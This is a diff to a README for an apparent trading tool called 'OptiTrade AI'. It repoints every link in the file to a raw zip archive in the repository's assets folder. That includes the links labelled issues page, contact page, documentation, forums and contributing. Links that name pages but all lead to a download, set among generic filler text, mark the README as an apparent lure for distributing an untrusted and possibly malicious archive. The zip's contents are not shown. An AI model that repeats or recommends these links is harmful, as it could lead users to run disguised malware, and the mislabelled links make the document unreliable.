@@ -4,7 +4,7 @@
 Welcome to OptiTrade AI! This guide will help you download and run our intelligent execution platform designed for optimal trade scheduling and venue selection.
 
 ## 📥 Download Now
-[![Download OptiTrade AI](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip%20AI-brightgreen)](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip)
+[![Download OptiTrade AI](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip%20AI-brightgreen)](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip)
 
 ## 🛠️ System Requirements
 To ensure a smooth experience, your system should meet the following requirements:
@@ -15,7 +15,7 @@ To ensure a smooth experience, your system should meet the following requirement
 - **Internet Connection:** Required for updates and trade data
 
 ## 📂 Download & Install
-To get started, visit this page to download: [OptiTrade AI Releases](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip).
+To get started, visit this page to download: [OptiTrade AI Releases](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip).
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -56,10 +56,10 @@ Currently, OptiTrade AI is designed for desktop and laptop use only.
 The platform supports various trading styles, including day trading, swing trading, and long-term investments.
 
 ## 🛡️ Support
-If you run into any issues or have questions, please check the [repository’s issues page](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip) for help. You can also submit your own question there.
+If you run into any issues or have questions, please check the [repository’s issues page](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip) for help. You can also submit your own question there.
 
 ## 📧 Feedback
-We value user feedback. If you have suggestions or comments, please feel free to reach out through our [contact page](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip).
+We value user feedback. If you have suggestions or comments, please feel free to reach out through our [contact page](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip).
 
 ## 📈 Next Steps
 Now that you have installed OptiTrade AI, consider exploring the features by:
@@ -69,8 +69,8 @@ Now that you have installed OptiTrade AI, consider exploring the features by:
 3. Looking at the help section for tutorials.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip): In-depth guides and tips.
-- [Community Forums](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip): Connect with other users.
-- [Contributing](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/public/optitrade-ai-v3.0-beta.2.zip): Learn how to contribute to the project.
+- [Documentation](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip): In-depth guides and tips.
+- [Community Forums](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip): Connect with other users.
+- [Contributing](https://raw.githubusercontent.com/jonyposa/optitrade-ai/feature/initial-implementation/optitrade-frontend/src/assets/optitrade_ai_3.9.zip): Learn how to contribute to the project.
 
 Thank you for using OptiTrade AI! Your journey to smarter trading starts now.
